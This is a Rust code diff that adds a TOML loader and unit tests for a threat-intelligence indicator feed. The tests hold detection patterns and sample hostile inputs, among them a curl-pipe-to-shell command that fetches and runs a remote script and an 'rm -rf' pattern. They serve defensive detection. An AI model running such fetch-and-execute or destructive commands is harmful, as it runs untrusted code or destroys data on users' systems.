@@ -419,3 +419,189 @@ fn builtin_indicators() -> Vec<ThreatIndicator> {
 
     indicators
 }
+
+// ── OSS threat-intel.toml format + loader ──
+//
+// The roadmap commitment is that the *format* of the feed is open while the
+// curated, signed feed stays Enterprise (ADR 0010 / ENTERPRISE.md): the file is
+// the schema, not the product. `threat-intel.toml` lets an operator extend the
+// built-in indicators with their own IOCs in plain text. Parsing is pure (no
+// clock, no network), so the resulting `feed_hash()` is reproducible.
+
+/// On-disk OSS threat-feed document. An ergonomic TOML schema (`[[indicator]]`
+/// array-of-tables with snake-friendly keys and defaults) that maps onto the
+/// internal [`ThreatIndicator`]. This struct is the public *format*; the signed
+/// Enterprise feed is a separate product, not a different format.
+#[derive(Debug, Clone, Deserialize)]
+pub struct ThreatFeedFile {
+    #[serde(default)]
+    pub indicator: Vec<ThreatIndicatorEntry>,
+}
+
+/// One `[[indicator]]` table in a `threat-intel.toml`. Only `id`, `type`, and
+/// `pattern` are required; the rest default so a hand-authored file stays terse.
+#[derive(Debug, Clone, Deserialize)]
+pub struct ThreatIndicatorEntry {
+    pub id: String,
+    #[serde(rename = "type")]
+    pub indicator_type: ThreatType,
+    /// Literal substring (case-insensitive), or `regex:<expr>` for a regex.
+    pub pattern: String,
+    #[serde(default = "default_severity")]
+    pub severity: String,
+    #[serde(default)]
+    pub description: String,
+    #[serde(default = "default_file_source")]
+    pub source: String,
+    /// RFC3339 timestamp. Optional and not clock-stamped on load (keeps parsing
+    /// deterministic); absent → empty.
+    #[serde(default)]
+    pub created_at: String,
+    #[serde(default = "default_true")]
+    pub active: bool,
+}
+
+fn default_severity() -> String {
+    "medium".to_string()
+}
+
+fn default_file_source() -> String {
+    "threat-intel.toml".to_string()
+}
+
+fn default_true() -> bool {
+    true
+}
+
+impl ThreatIndicatorEntry {
+    fn into_indicator(self) -> ThreatIndicator {
+        ThreatIndicator {
+            id: self.id,
+            indicator_type: self.indicator_type,
+            pattern: self.pattern,
+            severity: self.severity,
+            description: self.description,
+            source: self.source,
+            created_at: self.created_at,
+            active: self.active,
+        }
+    }
+}
+
+impl ThreatFeed {
+    /// Parse a `threat-intel.toml` document into indicators. The file is the OSS
+    /// *format*; the curated/signed feed stays Enterprise. Pure (no clock).
+    pub fn indicators_from_toml(text: &str) -> Result<Vec<ThreatIndicator>, toml::de::Error> {
+        let file: ThreatFeedFile = toml::from_str(text)?;
+        Ok(file
+            .indicator
+            .into_iter()
+            .map(ThreatIndicatorEntry::into_indicator)
+            .collect())
+    }
+}
+
+#[cfg(test)]
+mod toml_tests {
+    use super::*;
+
+    #[test]
+    fn parses_minimal_indicator_with_defaults() {
+        let doc = r#"
+            [[indicator]]
+            id = "acme-001"
+            type = "malicious_domain"
+            pattern = "evil.example.com"
+        "#;
+        let inds = ThreatFeed::indicators_from_toml(doc).expect("valid toml");
+        assert_eq!(inds.len(), 1);
+        let i = &inds[0];
+        assert_eq!(i.id, "acme-001");
+        assert_eq!(i.indicator_type, ThreatType::MaliciousDomain);
+        assert_eq!(i.pattern, "evil.example.com");
+        // defaults
+        assert_eq!(i.severity, "medium");
+        assert_eq!(i.source, "threat-intel.toml");
+        assert!(i.active, "active defaults to true");
+        assert_eq!(i.created_at, "");
+    }
+
+    #[test]
+    fn loaded_indicators_match_at_runtime() {
+        let doc = r#"
+            [[indicator]]
+            id = "acme-002"
+            type = "malicious_command"
+            pattern = "regex:curl\\s+.*\\|\\s*sh"
+            severity = "critical"
+            description = "pipe to shell"
+        "#;
+        let inds = ThreatFeed::indicators_from_toml(doc).expect("valid toml");
+        let feed = ThreatFeed::new();
+        for i in inds {
+            feed.add_indicator(i);
+        }
+        let matches = feed.check_threats("curl http://x/install.sh | sh");
+        assert!(
+            matches.iter().any(|m| m.indicator_id == "acme-002"),
+            "regex indicator from toml must match"
+        );
+    }
+
+    #[test]
+    fn inactive_indicator_is_loaded_but_skipped() {
+        let doc = r#"
+            [[indicator]]
+            id = "acme-003"
+            type = "malicious_domain"
+            pattern = "disabled.example.com"
+            active = false
+        "#;
+        let inds = ThreatFeed::indicators_from_toml(doc).expect("valid toml");
+        assert!(!inds[0].active);
+        let feed = ThreatFeed::new();
+        feed.add_indicator(inds.into_iter().next().unwrap());
+        assert!(
+            feed.check_threats("visit disabled.example.com").is_empty(),
+            "inactive indicators do not match"
+        );
+    }
+
+    #[test]
+    fn feed_hash_is_deterministic_for_a_loaded_file() {
+        let doc = r#"
+            [[indicator]]
+            id = "b"
+            type = "malicious_domain"
+            pattern = "b.example.com"
+            [[indicator]]
+            id = "a"
+            type = "malicious_command"
+            pattern = "rm -rf /tmp/x"
+        "#;
+        let build = || {
+            let feed = ThreatFeed::new();
+            for i in ThreatFeed::indicators_from_toml(doc).unwrap() {
+                feed.add_indicator(i);
+            }
+            feed.feed_hash()
+        };
+        assert_eq!(build(), build(), "same file -> same feed hash");
+    }
+
+    #[test]
+    fn malformed_toml_is_an_error() {
+        let doc = r#"
+            [[indicator]]
+            id = "x"
+            type = "not_a_real_type"
+            pattern = "y"
+        "#;
+        assert!(ThreatFeed::indicators_from_toml(doc).is_err());
+    }
+
+    #[test]
+    fn empty_document_yields_no_indicators() {
+        assert!(ThreatFeed::indicators_from_toml("").unwrap().is_empty());
+    }
+}
